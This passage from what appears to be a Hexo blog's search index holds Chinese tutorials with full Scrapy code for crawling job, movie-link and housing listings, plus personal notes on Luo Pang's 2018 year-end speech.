crawl_update_time = scrapy.Field()  # 抓取更新时间</code></pre><h2 id="对url连接进行MD5"><a href="#对url连接进行MD5" class="headerlink" title="对url连接进行MD5"></a>对url连接进行MD5</h2><pre><code>import hashlibdef get_md5(url):    &quot;&quot;&quot;    将url链接转换成md5    :param url:    :return:    &quot;&quot;&quot;    if isinstance(url, str):        url = url.encode(&quot;utf-8&quot;)       # 设置url的编码为utf-8    m = hashlib.md5()    m.update(url)    return m.hexdigest()</code></pre><h2 id="使用Twisted进行异步IO插入"><a href="#使用Twisted进行异步IO插入" class="headerlink" title="使用Twisted进行异步IO插入"></a>使用Twisted进行异步IO插入</h2><p>当我们处理大量的请求的时候,异步插入要比同步插入速度快很多</p><pre><code>class MysqlTwistedPipeline(object):    &#39;&#39;&#39;    使用Twisted框架完成异步Mysql插入    &#39;&#39;&#39;    def __init__(self, dbpool):        self.dbpool = dbpool    @classmethod    def from_settings(cls, settings):        &quot;&quot;&quot;        读取Scrapy的Setting文件,Scrapy自动调用此方法        &quot;&quot;&quot;        # 该字典中的参数名称必须和MySQLdb.connections.Connection类中的参数名称要一致        dbparms = dict(            host=settings[&quot;MYSQL_HOST&quot;],            db=settings[&quot;MYSQL_DBNAME&quot;],            user=settings[&#39;MYSQL_USER&#39;],            password=settings[&#39;MYSQL_PASSWORD&#39;],            charset=&#39;utf8&#39;,            cursorclass=MySQLdb.cursors.DictCursor,            use_unicode=True,        )        dbpool = adbapi.ConnectionPool(&quot;MySQLdb&quot;, **dbparms)        return cls(dbpool)    def process_item(self, item, spider):        # 使用Twisted将Mysql插入变成异步执行        query = self.dbpool.runInteraction(self.do_insert, item)        query.addErrback(self.handle_error, item, spider)  # 处理异常    def handle_error(self, failure, item, spider):        &quot;&quot;&quot;        该函数用来处理异步插入的异常        &quot;&quot;&quot;        print(failure)    def do_insert(self, cursor, item):        # 执行具体的插入        insert_sql = &quot;&quot;&quot;            insert into lagoujob(url,url_object_id,title,salary,city,years,degree,job_type,publish_time,tags,job_advantage,job_desc,job_addr,company_url,company_name,crawl_time)            values(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)                       &quot;&quot;&quot;        cursor.execute(insert_sql,                       (item[&#39;url&#39;], item[&#39;url_object_id&#39;], item[&#39;title&#39;], item[&#39;salary&#39;], item[&#39;city&#39;],                        item[&#39;years&#39;], item[&#39;degree&#39;], item[&#39;job_type&#39;], item[&#39;publish_time&#39;], item[&#39;tags&#39;],                        item[&#39;job_advantage&#39;],item[&#39;job_desc&#39;],item[&#39;job_addr&#39;],item[&#39;company_url&#39;],item[&#39;company_name&#39;],item[&#39;crawl_time&#39;]))</code></pre><h2 id="源码分享"><a href="#源码分享" class="headerlink" title="源码分享"></a>源码分享</h2><p><strong>欢迎Star </strong><a href="https://github.com/liu726301387/LaGouJobSpider" target="_blank" rel="noopener">https://github.com/liu726301387/LaGouJobSpider</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider案例80S电影链接爬虫</title>
      <link href="/2019/01/13/scrapycrawlspider-an-li-80s-dian-ying-lian-jie-pa-chong/"/>
      <url>/2019/01/13/scrapycrawlspider-an-li-80s-dian-ying-lian-jie-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="项目准备"><a href="#项目准备" class="headerlink" title="项目准备"></a>项目准备</h1><h2 id="新建Scrapy项目"><a href="#新建Scrapy项目" class="headerlink" title="新建Scrapy项目"></a>新建Scrapy项目</h2><pre><code>scrapy startproject Spider_80s</code></pre><h1 id="新建CrawlSpider爬虫"><a href="#新建CrawlSpider爬虫" class="headerlink" title="新建CrawlSpider爬虫"></a>新建CrawlSpider爬虫</h1><p>切换到项目目录下执行</p><pre><code>scrapy genspider -t crawl MovieSpider 80s.tw</code></pre><h1 id="分析目标网站"><a href="#分析目标网站" class="headerlink" title="分析目标网站"></a>分析目标网站</h1><h2 id="列表页分析"><a href="#列表页分析" class="headerlink" title="列表页分析"></a>列表页分析</h2><p>抓取目标网站所有最新电影.</p><p>首页</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/dsuvtnePPXDPTN*WQxHXyRsh8ZfUOxj6ldCXDUjIofU!/b/dFMBAAAAAAAA&amp;bo=5QV7AwAAAAADB7o!&amp;rf=viewer_4" alt="首页"></p><p>最新电影页面</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/w.cOqpts9wTi83sTCdU9MEbOvpW6zZRYopKLLXHup0Y!/b/dL4AAAAAAAAA&amp;bo=DgaAAwAAAAADN5k!&amp;rf=viewer_4" alt="最新电影"></p><p>分页URL</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SpfqXyUus7Cep.49d1GuYPOcy8o5uDqyK6m7CJhG6mk!/b/dEgBAAAAAAAA&amp;bo=mwRQAwAAAAADR64!&amp;rf=viewer_4" alt="分页"></p><p>从分页URL里面可以分析出来该网站分页URL的规律,后面url尾部的数字是每一页号码.</p><p><a href="https://www.80s.tw/movie/list/-----p/**2*" target="_blank" rel="noopener">https://www.80s.tw/movie/list/-----p/**2*</a>*</p><h2 id="详情页url提取"><a href="#详情页url提取" class="headerlink" title="详情页url提取"></a>详情页url提取</h2><p>在最新列表页面中可以找到电影详情页面的URL</p><p>在列表页中每个影片的详情页url都是在a标签下的href属性中</p><pre><code>href=&quot;/movie/23902&quot;</code></pre><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6VgZ7gZFmlz2FKKE4nuqEfwfFFBLmU0EBqkSw3MyZkw!/b/dL8AAAAAAAAA&amp;bo=mgWsAgAAAAADNyM!&amp;rf=viewer_4" alt="详情页url"></p><h2 id="详情页分析"><a href="#详情页分析" class="headerlink" title="详情页分析"></a>详情页分析</h2><p>拿刚刚的详情页url作为例子,分析下详情页中我们想要提取的数据</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/z5MolR3DQ0NnKkGAUnX2s52Waq9g5fkHUynuraIlhnA!/b/dEkBAAAAAAAA&amp;bo=WgR9AwAAAAADJyI!&amp;rf=viewer_4" alt="详情页"></p><h1 id="Scrapy代码编写"><a href="#Scrapy代码编写" class="headerlink" title="Scrapy代码编写"></a>Scrapy代码编写</h1><p>MovieSpider中填写开始URL,这里我们是从第一页开始爬取的所以就写电影列表中第一页的url</p><pre><code>https://www.80s.tw/movie/list/-----p/1</code></pre><p>定义电影列表页url的提取规则和电影详情页url的提取规则</p><pre><code>Rule(LinkExtractor(allow=r&#39;https://www.80s.tw/movie/list/-----p/\d&#39;), follow=True),     # 电影列表页url的提取Rule(LinkExtractor(allow=&quot;.*/movie/\d&quot;), callback=&quot;parse_item&quot;, follow=False),      # 电影详情页面url的提取</code></pre><p>Rule规则里面我们提取了详情页面之后,对详情页进行爬取提取里面我们想要的数据.所以这里的callback参数我们指定为<strong>parse_item</strong>方法,该方法用来提取详情页中的数据.</p><pre><code>def parse_item(self, response):    title = response.xpath(&quot;//div[@class=&#39;info&#39;]/h1/text()&quot;).get()  # 影片名    info = response.xpath(&quot;//div[@class=&#39;info&#39;]/span[1]/text()&quot;).get()  # 影片简介    release_date = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[5]/text()&quot;).get()  # 上映日期    mins = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[6]/text()&quot;).get()  # 影片时长    grade = response.xpath(&quot;//div[@class=&#39;info&#39;]/div[2]/span[1]/text()&quot;).getall()[-1].strip()  # 豆瓣评分    size = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/text()&quot;).getall()[-1].strip()  # 影片大小    download_link = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/a/@href&quot;).get()  # 影片下载链接    items = Spider80SItem(title=title, info=info, release_date=release_date, mins=mins, grade=grade, size=size,                          download_link=download_link)    yield items</code></pre><p>在parse_item函数中我们处理爬虫的响应,并从响应中提取数据.</p><p>这里我们主要提取</p><ol><li>电影名</li><li>影片简介</li><li>上映日期</li><li>影片时长</li><li>豆瓣评分</li><li>影片大小</li><li>影片下载链接</li></ol><h2 id="将数据保存为JSON格式"><a href="#将数据保存为JSON格式" class="headerlink" title="将数据保存为JSON格式"></a>将数据保存为JSON格式</h2><p>在爬虫项目中编辑Pipelines用来保存数据</p><pre><code>class Spider80SPipeline(object):    def __init__(self):        self.fileProject = open(&quot;80sLink.json&quot;, &#39;wb&#39;)  # 文件对象        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)       # JSON输出对象    def process_item(self, item, spider):        self.exporter.export_item(item)     # 处理Item输出        return item    def close_spider(self, spider):        self.fileProject.close()        # 关闭文件对象</code></pre><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><h1 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h1><pre><code>│  scrapy.cfg│  start.py        # 项目启动文件│└─Spider_80s    │  items.py    # Model    │  middlewares.py    # 中间件    │  pipelines.py        # 管道    │  settings.py        # 配置文件    │  __init__.py    │    ├─spiders    │  │  MovieSpider.py        # 爬虫</code></pre><p>MovieSpider.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom Spider_80s.items import Spider80SItemclass MoviespiderSpider(CrawlSpider):    name = &#39;MovieSpider&#39;    allowed_domains = [&#39;80s.tw&#39;]    start_urls = [&#39;https://www.80s.tw/movie/list/-----p/1&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;https://www.80s.tw/movie/list/-----p/\d&#39;), follow=True),     # 电影列表页url的提取        Rule(LinkExtractor(allow=&quot;.*/movie/\d&quot;), callback=&quot;parse_item&quot;, follow=False),      # 电影详情页面url的提取    )    def parse_item(self, response):        title = response.xpath(&quot;//div[@class=&#39;info&#39;]/h1/text()&quot;).get()  # 影片名        info = response.xpath(&quot;//div[@class=&#39;info&#39;]/span[1]/text()&quot;).get()  # 影片简介        release_date = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[5]/text()&quot;).get()  # 上映日期        mins = response.xpath(&quot;//div[@class=&#39;clearfix&#39;]/span[6]/text()&quot;).get()  # 影片时长        grade = response.xpath(&quot;//div[@class=&#39;info&#39;]/div[2]/span[1]/text()&quot;).getall()[-1].strip()  # 豆瓣评分        size = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/text()&quot;).getall()[-1].strip()  # 影片大小        download_link = response.xpath(&quot;//ul[@class=&#39;dllist1&#39;]/li[2]/span[1]/span/a/@href&quot;).get()  # 影片下载链接        items = Spider80SItem(title=title, info=info, release_date=release_date, mins=mins, grade=grade, size=size,                              download_link=download_link)        yield items</code></pre><p>items.py</p><pre><code>import scrapyclass Spider80SItem(scrapy.Item):    title = scrapy.Field()    info = scrapy.Field()    release_date = scrapy.Field()    mins = scrapy.Field()    grade = scrapy.Field()    size = scrapy.Field()    download_link = scrapy.Field()</code></pre><p>pipelines.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass Spider80SPipeline(object):    def __init__(self):        self.fileProject = open(&quot;80sLink.json&quot;, &#39;wb&#39;)  # 文件对象        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)       # JSON输出对象    def process_item(self, item, spider):        self.exporter.export_item(item)     # 处理Item输出        return item    def close_spider(self, spider):        self.fileProject.close()        # 关闭文件对象</code></pre><p>settings.py</p><pre><code># -*- coding: utf-8 -*-BOT_NAME = &#39;Spider_80s&#39;SPIDER_MODULES = [&#39;Spider_80s.spiders&#39;]NEWSPIDER_MODULE = &#39;Spider_80s.spiders&#39;ROBOTSTXT_OBEY = FalseDOWNLOAD_DELAY = 1DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;,}ITEM_PIPELINES = {    &quot;Spider_80s.pipelines.Spider80SPipeline&quot;: 300,}</code></pre><h1 id="爬取结果展示"><a href="#爬取结果展示" class="headerlink" title="爬取结果展示"></a>爬取结果展示</h1><p>JSON格式数据</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Hm.390Qns5e8OkhLCnyJI*.M.oh32IOY.gRxS.4oYFc!/b/dDMBAAAAAAAA&amp;bo=gwYXAwAAAAADJ5M!&amp;rf=viewer_4" alt="JSON结果"></p><p>CSV格式数据</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Jbwf2SVkg7kAKJp0*Ewc.pelbRcxeu.uhN.8UJTD.EE!/b/dDEBAAAAAAAA&amp;bo=gAcZAwAAAAADB78!&amp;rf=viewer_4" alt="CSV结果"></p><h1 id="JSON格式文件转CSV格式"><a href="#JSON格式文件转CSV格式" class="headerlink" title="JSON格式文件转CSV格式"></a>JSON格式文件转CSV格式</h1><pre><code>import csvimport jsonimport sysimport collections  # 有序字典def trans(path):    jsonData = open(path + &#39;.json&#39;,encoding=&#39;utf-8&#39;)    csvfile = open(path + &#39;.csv&#39;, &#39;w&#39;, newline=&#39;&#39;,encoding=&#39;utf-8&#39;)  # python3下    for line in jsonData:  # 获取属性列表        dic = json.loads(line[0:])        keys = dic.keys()        break    writer = csv.writer(csvfile)    writer.writerow(keys)  # 将属性列表写入csv中    for dic in jsonData:  # 读取json数据的每一行，将values数据一次一行的写入csv中        dic = json.loads(dic[0:])        writer.writerow(dic.values())    jsonData.close()    csvfile.close()trans(&quot;./80sLink&quot;)</code></pre><p>将JSON文件转换成CSV文件之后会出现乱码,解决方法是使用Notepad++打开CSV文件,然后<strong>将CSV文件的编码改成UTF-8BOM</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>罗胖2018年终演讲</title>
      <link href="/2019/01/06/luo-pang-2018-nian-zhong-yan-jiang/"/>
      <url>/2019/01/06/luo-pang-2018-nian-zhong-yan-jiang/</url>
      
        <content type="html"><![CDATA[<h1 id="开场"><a href="#开场" class="headerlink" title="开场"></a>开场</h1><ol><li>岁月不饶人,你们确实没有饶过岁月</li><li>你有你的计划,这个世界另有计划</li><li>穿着体面有各种各样的计划.</li><li>以前变化是生活的一部分,现在变化成了生活的本身</li><li>熟悉的也许只能用来怀念,而依赖的我们必须放手</li><li>2019年可能会是过去十年里最差的一年,但却是未来十年里最好的一年<ul><li>何必悲观</li></ul></li><li>做事的人其实无所谓悲观还是乐观,因为他们只关心怎么把事做好,让自己的生命处于上升期<ol><li>不做事的人的重要特点总会问一些抽象的问题:理想和现实怎么平衡,我和你妈掉水里你先救谁</li></ol></li><li>抽象的两难,在具体情境中一点儿也不难</li><li>我们要搞定的,无非是一张时间表</li><li>宏观是我们必须接受的,微观才是我们可以有所作为的.</li><li>我们是伞兵,伞兵天生就是被包围的</li><li><strong>世界上只有一种英雄主义,就是认清了生活的真相还仍然热爱它</strong></li><li>既然这个世界另有计划,那么我们就重新计划</li><li>宁可被说成是猪,也一定要站在风口,哪怕看到千军万马,我也要过那个独木桥</li></ol><h1 id="小趋势"><a href="#小趋势" class="headerlink" title="小趋势"></a>小趋势</h1><ol><li>4G已经是5年前的事情了,5G时代的到来,对你所处的行业会造成什么影响?</li><li>曾今的世界是大河模型,顺之者昌,逆之者亡.现在的世界是多米诺骨牌模型.</li><li>天猫为什么叫天猫呢?为什么不能叫天狗呢?因为猫砂的发明<ol><li>猫砂绝对是人类科技的伟大发明</li></ol></li><li><strong>小趋势是影响趋势的趋势,是带来改变的改变</strong></li><li>美团背后的人工智能:<ol><li>每天2千万单外卖</li><li>60万个外卖小哥</li><li>每个小时最高峰要做29亿次路线规划<ul><li><strong>背后1万名程序员</strong></li></ul></li></ol></li><li>天猫的千人千面<strong>(人工智能)</strong><ul><li>鹿班系统</li></ul></li><li>虽然大趋势不是我的游戏,但是他会改变我的游戏</li><li>关于机会的两个看法<ol><li>每一班车停靠的时间都特别短,短的自己很可能赶不上,而且每一班车看起来都像是末班车</li><li>在小趋势的逻辑里,从来没有末班车<ol><li>2012年微信公众号</li><li>2013年淘宝扶持网红电商</li><li>2014年OTO</li><li>2015年社交电商</li><li>2016年拼团</li><li>2017年直播电商</li><li>……从来都没有末班车,人生处处是机会.</li></ol></li></ol></li><li>小趋势的逻辑里,没有直达车</li><li><strong>凡 杀不死我的,都会让我更强大</strong><ol><li><strong>凡我赶不上的,我就在未来等他.</strong></li></ol></li></ol><h1 id="一些自问"><a href="#一些自问" class="headerlink" title="一些自问"></a>一些自问</h1><ol><li>你能看到事实吗?<ul><li>真相,退的离我们越来越远</li><li>真相未必神秘,但很隐秘</li></ul></li><li>别把自己当做主流</li><li>我们生活在一个庞大的,远超过自己感知力的共同体当中</li><li>等号的意思?<ol><li><strong>等号的意思是有些东西不重要</strong><ul><li><strong>找到好工作等于稳定的收入,那么就是说收入才重要,自己喜不喜欢这个工作不重要</strong></li></ul></li></ol></li><li>不抽象就无法深入思考,不还原就看不到本来面目</li><li>制造业是我们构建良好社会的压舱石</li><li>你必须做一个理性乐观派</li></ol><h1 id="多元思维模型"><a href="#多元思维模型" class="headerlink" title="多元思维模型"></a>多元思维模型</h1><p>一个人能同时保有全然相反的两种观念,还能正常行事,是第一流智慧的标志.</p><ul><li>一个人也想好好生活</li><li>有一类创新,叫往回走</li></ul><h1 id="小趋势决定个体命运"><a href="#小趋势决定个体命运" class="headerlink" title="小趋势决定个体命运"></a>小趋势决定个体命运</h1><ul><li>知识多,人生短,追着学,就挂了.</li><li>每个人都有一个计划,直到被一拳打到脸上</li><li>过去婚姻是成年的第一件事,现在,婚姻是把自己整理好后才做的事.<br>我特别后悔60岁那年没有学小提琴,否则,我就有40年经验了.</li></ul><p>我们这代人60岁上个大学,70岁创个业,80岁学个手艺.我们这代人都是这样生活,不这样生活难道要等到100岁难道再后悔吗?</p><ul><li>种一棵树最好的时间是十年前,其实就是现在</li></ul><h1 id="如何面对挫折"><a href="#如何面对挫折" class="headerlink" title="如何面对挫折"></a>如何面对挫折</h1><ul><li>丘吉尔:这不是结束,甚至不是结束的开始,只是开始的结束.</li><li>所有能穿越时间的东西,就该坚守,所有会被时间过滤的,该翻篇就翻篇.</li><li>这个时代不要在朋友圈里观天下,有机会翻翻他的收藏夹</li><li>你在朋友圈里又佛又丧,你在收藏夹里积极向上.</li><li>人的感知和判断,胜过千万条数据</li><li>人的良知良能,是最好的感知和判断的工具</li><li>用人的体验丈量世界</li></ul><h1 id="时间愿意和我做朋友吗"><a href="#时间愿意和我做朋友吗" class="headerlink" title="时间愿意和我做朋友吗?"></a>时间愿意和我做朋友吗?</h1><p>长期主义</p><ul><li>一旦中断,前功尽弃.</li><li><strong>普通人的努力,在长期主义的复利下,会积累成奇迹</strong></li><li>一千年有一千年的干法,一个月有一个月的干法.<ul><li>撩妹送礼物不要一次送完,一个月每周都送一个小礼物会好很多.长期主义实战.</li></ul></li><li><strong>成就=核心算法x大量重复动作2(平方)</strong></li><li>所有的事到最后都会是好事,如果还不是那它就还没到最后</li></ul><p><strong>对未来最大的慷慨,是把一切献给现在</strong></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider案例安居客二手房爬虫</title>
      <link href="/2018/12/31/scrapycrawlspider-an-li-an-ju-ke-er-shou-fang-pa-chong/"/>
      <url>/2018/12/31/scrapycrawlspider-an-li-an-ju-ke-er-shou-fang-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/EJP*NR5jwlyuxBzfO1jhTzw38z.Vo6n8wzYxlO2dwVM!/b/dFIBAAAAAAAA&amp;bo=bQZTAwAAAAADBxk!&amp;rf=viewer_4" alt="数据展示"></p><pre><code>{    &quot;小区名&quot;:&quot;学府名苑&quot;,    &quot;总价&quot;:&quot;75&quot;,    &quot;首付&quot;:&quot;22.50万&quot;,    &quot;单价&quot;:&quot;9036 元/m²&quot;,    &quot;面积&quot;:&quot;83平方米&quot;,    &quot;房屋类型&quot;:&quot;2室2厅1卫&quot;,    &quot;建造时间&quot;:&quot;2013年&quot;,    &quot;房屋类型&quot;:&quot;普通住宅&quot;,    &quot;建造年限&quot;:&quot;满五年&quot;}</code></pre><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>项目目录结构</p><pre><code>│  scrapy.cfg│  start.py        # Scrapy启动文件│  XuChangHouse.json    # 数据存储│└─XuChangHouse    │  items.py    │  middlewares.py    │  pipelines.py    │  settings.py    │  __init__.py    │    ├─spiders    │  │  resold_Apartment.py    # 爬虫    │  │  __init__.py</code></pre><p>setting.py</p><pre><code>BOT_NAME = &#39;XuChangHouse&#39;SPIDER_MODULES = [&#39;XuChangHouse.spiders&#39;]NEWSPIDER_MODULE = &#39;XuChangHouse.spiders&#39;ROBOTSTXT_OBEY = FalseDOWNLOAD_DELAY = 1DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;,    &quot;TE&quot;:&quot;Trailers&quot;,}ITEM_PIPELINES = {   &#39;XuChangHouse.pipelines.XuchanghousePipeline&#39;: 300,}</code></pre><p>resold_Apartment.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom XuChangHouse.items import XuchanghouseItemclass ResoldApartmentSpider(CrawlSpider):    name = &#39;resold_Apartment&#39;    allowed_domains = [&#39;xuchang.anjuke.com&#39;]    start_urls = [&#39;https://xuchang.anjuke.com/sale/p1-rd1/#filtersort&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;https://xuchang.anjuke.com/sale/.+/#filtersort&#39;), follow=True), # 匹配页数        Rule(LinkExtractor(allow=r&#39;.+[A-Z0-9]?from=.*&#39;,),callback=&quot;parse_item&quot;,follow=False),     # 详情页面    )    def parse_item(self, response):        estate = response.xpath(&quot;//div[@class=&#39;houseInfo-content&#39;]/a/text()&quot;).get()  # 所属小区        total = response.css(&#39;.light &gt; em:nth-child(1)::text&#39;).get()  # 总价        down_payment = response.xpath(&quot;//ul/li[6]/div[2]/text()&quot;).get().strip()  # 首付        unit_price = response.xpath(&quot;//ul/li[3]/div[2]/text()&quot;).get().strip()  # 房屋单价        area = response.xpath(&quot;//ul/li[5]/div[2]/text()&quot;).get().strip()  # 建筑面积        family_type = response.xpath(&quot;//ul/li[2]/div[2]/text()&quot;).get().replace(&#39;\t&#39;, &#39;&#39;)  # 户型        time = response.xpath(&quot;//ul/li[7]/div[2]/text()&quot;).get().strip() # 建造年代        house_types = response.xpath(&#39;//ul/li[10]/div[2]/text()&#39;).get().strip()       # 房屋类型        age_limit = response.xpath(&quot;//ul/li[13]/div[2]/text()&quot;).get().strip()       # 房本年限        # Monthly_payment = response.css(&quot;#reference_monthpay&quot;).get() # 月供,span标签在页面上显示但是scrapy提取之后没有内容        # print(f&quot;小区{estate}\n年代{time}\n类型{house_types}\n房本年限{age_limit}\n户型{family_type}面积{area}单价{unit_price}\n首付{down_payment}\n&quot;)        item = XuchanghouseItem(estate=estate,total=total,down_payment=down_payment,unit_price=unit_price,area=area,family_type=family_type,time=time,house_types=house_types,age_limit=age_limit)        yield item</code></pre><p>items.py</p><pre><code>import scrapyclass XuchanghouseItem(scrapy.Item):    estate = scrapy.Field()         # 小区    total = scrapy.Field()          # 总价    down_payment = scrapy.Field()    # 首付    unit_price = scrapy.Field()     # 单价    area = scrapy.Field()           # 地区    family_type = scrapy.Field()    # 户型    time = scrapy.Field()           # 建造时间    house_types = scrapy.Field()    # 类型    age_limit = scrapy.Field()      # 年代</code></pre><p>middlewares.py</p><p>默认不变</p><p>pipelines.py</p><pre><code># -*- coding: utf-8 -*-# Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.htmlfrom scrapy.exporters import JsonLinesItemExporterclass XuchanghousePipeline(object):    def __init__(self):        self.fileProject = open(&quot;XuChangHouse.json&quot;, &#39;wb&#39;)  # json文件对象        self.exporters = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporters.export_item(item)        return itemdef close_spider(self, spider):    self.fileProject.close()</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&#39;scrapy crawl resold_Apartment&#39;.split())</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider案例腾讯招聘爬虫</title>
      <link href="/2018/12/31/scrapycrawlspider-an-li-teng-xun-zhao-pin-pa-chong/"/>
      <url>/2018/12/31/scrapycrawlspider-an-li-teng-xun-zhao-pin-pa-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/pC.BjHS61tcpui4wiUh*nyscELWojfOQhziAA6HNWl8!/b/dMMAAAAAAAAA&amp;bo=gQZFAwAAAAADB.M!&amp;rf=viewer_4" alt="结果展示"></p><pre><code>{    &quot;职位名字&quot;:&quot;27553-腾讯音乐测试开发工程师（深圳）&quot;,    &quot;要求&quot;:[        &quot;计算机相关专业本科及以上学历；&quot;,        &quot;3年以上系统测试工作经验，有白盒测试经验，有自动化测试框架开发经验者优先；&quot;,        &quot;具有Web、Android和IOS自动化测试经验，熟悉selenium 、Appium框架，熟练使用Jmeter进行性能测试；&quot;,        &quot;熟悉Linux系统，MySql数据库, 以及TCP/IP, HTTP等网络协议；&quot;,        &quot;熟悉java/C或C++，熟悉shell/python/PHP/perl等一种脚本语言；&quot;,        &quot;熟悉测试流程和规范，了解功能测试，性能测试，接口测试和单元测试等测试方法；&quot;,        &quot;学习能力和技术钻研能力强，良好的质量意识、沟通和团队合作能力；&quot;,        &quot;工作积极主动，执行力强，能够快速解决问题。&quot;    ],    &quot;工作地点&quot;:&quot;深圳&quot;,    &quot;招聘人数&quot;:&quot;1人&quot;}</code></pre><h1 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h1><pre><code>L:.│  scrapy.cfg│  start.py│  腾讯Python职位招聘信息.json│└─TecentSpider    │  items.py    │  middlewares.py    │  pipelines.py    │  settings.py    │  __init__.py    │    ├─spiders    │  │  TecentZhaoPin.py    │  │  __init__.py    │  │</code></pre><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>TecentZhaoPin.py</p><pre><code>    # -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom TecentSpider.items import TecentspiderItemclass TecentzhaopinSpider(CrawlSpider):    name = &#39;TecentZhaoPin&#39;    allowed_domains = [&#39;hr.tencent.com&#39;]    start_urls = [&#39;https://hr.tencent.com/position.php?keywords=python&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;.+&amp;start=\d&#39;), follow=True),       # 下一页的获取        Rule(LinkExtractor(allow=r&#39;.+\d&amp;keywords=python&amp;tid=0&amp;lid=0&#39;),callback=&#39;parse_item&#39;,follow=False), # 详情页面的URL获取    )    def parse_item(self, response):        job_title = response.xpath(&quot;//*[@id=&#39;sharetitle&#39;]/text()&quot;).get()     # 职位名        require = response.xpath(&quot;/html/body/div[3]/div/table/tr[4]/td/ul//text()&quot;).getall()      # 职位要求\        site = response.xpath(&quot;/html/body/div[3]/div/table/tr[@class=&#39;c bottomline&#39;]/td[1]/text()&quot;).get()   # 工作地点        people_num = response.xpath(&#39;/html/body/div[3]/div/table/tr[2]/td[3]/text()&#39;).get()     # 招聘人数        print(f&quot;职位名:{job_title}\n职位要求{require}\n工作地点{site}\n招聘人数{people_num}&quot;)        item = TecentspiderItem(job_title=job_title,require=require,site=site,people_num=people_num)        yield item</code></pre><p>items.py</p><pre><code>import scrapyclass TecentspiderItem(scrapy.Item):    job_title = scrapy.Field()      # 职位名    require = scrapy.Field()        # 职位要求    site = scrapy.Field()           # 工作地点    people_num = scrapy.Field()     # 招聘人数</code></pre><p>middlewares.py</p><p>默认不变</p><p>pipelines.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass TecentspiderPipeline(object):    def __init__(self):        self.fileProject = open(&quot;腾讯Python职位招聘信息.json&quot;, &#39;wb&#39;)  # json文件对象        self.exporters = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporters.export_item(item)        return item    def close_spider(self, spider):        